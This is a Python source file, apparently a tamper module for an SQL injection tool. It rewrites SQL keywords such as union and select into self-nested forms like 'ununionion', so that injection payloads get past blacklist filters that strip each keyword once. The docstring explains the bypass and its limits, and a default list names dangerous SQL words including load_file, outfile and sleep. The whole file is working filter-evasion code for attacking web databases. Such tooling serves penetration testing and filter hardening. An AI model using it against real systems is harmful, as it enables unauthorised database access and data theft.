# -*- coding: utf-8 -*-
"""Keyword nesting -- bypass "single-replacement" style blacklists

Targets this kind of implementation:
    $in = str_replace(['union','select','and'...], '', $in);   // deletes only once

Split the keyword in the middle and stuff the whole word back in:
    union  -> un  + union + ion  =  ununionion
    select -> sel + select + ect =  selseselectect
After the filter deletes the middle keyword, the remainder spells the original word back out, and the SQL engine parses it as usual.

Notes:
  * ineffective against presence (die on hit) style (the nested string still contains the "union" substring)
  * ineffective against recursive-delete style
  * only transform outside quotes, and only nest "words actually listed in the blacklist"
"""
import re

from tamper._util import transform_outside_quotes

# Common nestable keywords (fallback set when no blacklist information is available)
DEFAULT_WORDS = [
    "union", "select", "insert", "update", "delete", "drop",
    "extractvalue", "updatexml", "sleep", "benchmark", "load_file",
    "outfile", "dumpfile", "procedure", "handler", "truncate",
    "where", "from", "limit", "concat", "substr", "ascii",
]


def nest_word(w):
    """Split the word in the middle and insert itself; words that are too short (like or) are left alone to avoid hitting others."""
    n = len(w)
    if n < 3:
        return w
    k = n // 2
    return (w[:k] + w + w[k:]).lower()


def make(words):
    """Build a nesting tamper bound to the given word list."""
    words = sorted({w.lower() for w in words if len(w) >= 3}, key=len, reverse=True)
    pats = [(re.compile(r"(?<![A-Za-z0-9_])" + re.escape(w) + r"(?![A-Za-z0-9_])",
                        re.IGNORECASE), nest_word(w)) for w in words]

    def _apply(s):
        def f(seg):
            for pat, rep in pats:
                seg = pat.sub(rep, seg)
            return seg
        return transform_outside_quotes(s, f)

    return _apply


# Fallback: nest by the default word list when there is no blacklist
keyword_nest = make(DEFAULT_WORDS)
